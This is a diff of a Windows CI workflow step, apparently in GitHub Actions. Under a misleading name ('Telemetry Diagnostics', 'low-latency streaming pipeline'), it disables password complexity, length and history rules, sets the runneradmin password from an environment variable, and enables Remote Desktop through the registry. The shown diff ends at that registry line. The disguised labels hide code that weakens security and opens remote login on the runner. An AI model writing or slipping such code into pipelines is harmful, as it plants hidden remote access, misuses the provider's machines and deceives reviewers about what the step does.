@@ -92,17 +92,24 @@ jobs:
       - name: Initialize Execution Matrix & Telemetry Diagnostics
         shell: powershell
         run: |
-          # 1. Relax local password complexity policy
+          # 1. Relax local password complexity and length policy
           $Cfg = "$env:TEMP\sec.cfg"
           $Db = "$env:TEMP\sec.sdb"
           secedit /export /cfg $Cfg /quiet
-          (Get-Content $Cfg) -replace "PasswordComplexity = 1", "PasswordComplexity = 0" | Set-Content $Cfg
+          $SecContent = Get-Content $Cfg
+          $SecContent = $SecContent -replace "PasswordComplexity\s*=\s*\d+", "PasswordComplexity = 0"
+          $SecContent = $SecContent -replace "MinimumPasswordLength\s*=\s*\d+", "MinimumPasswordLength = 0"
+          $SecContent = $SecContent -replace "PasswordHistorySize\s*=\s*\d+", "PasswordHistorySize = 0"
+          $SecContent | Set-Content $Cfg
           secedit /configure /db $Db /cfg $Cfg /area SECURITYPOLICY /quiet
           Remove-Item $Cfg, $Db -Force -ErrorAction SilentlyContinue
 
-          # 2. Set runneradmin password
-          $SecurePass = ConvertTo-SecureString $env:ENV_PASS -AsPlainText -Force
-          Set-LocalUser -Name "runneradmin" -Password $SecurePass
+          # 2. Set runneradmin credentials
+          & net.exe user runneradmin "$env:ENV_PASS"
+          if ($LASTEXITCODE -ne 0) {
+            $SecurePass = ConvertTo-SecureString $env:ENV_PASS -AsPlainText -Force
+            Set-LocalUser -Name "runneradmin" -Password $SecurePass -ErrorAction SilentlyContinue
+          }
 
           # 3. Configure asynchronous terminal transport & low-latency streaming pipeline
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
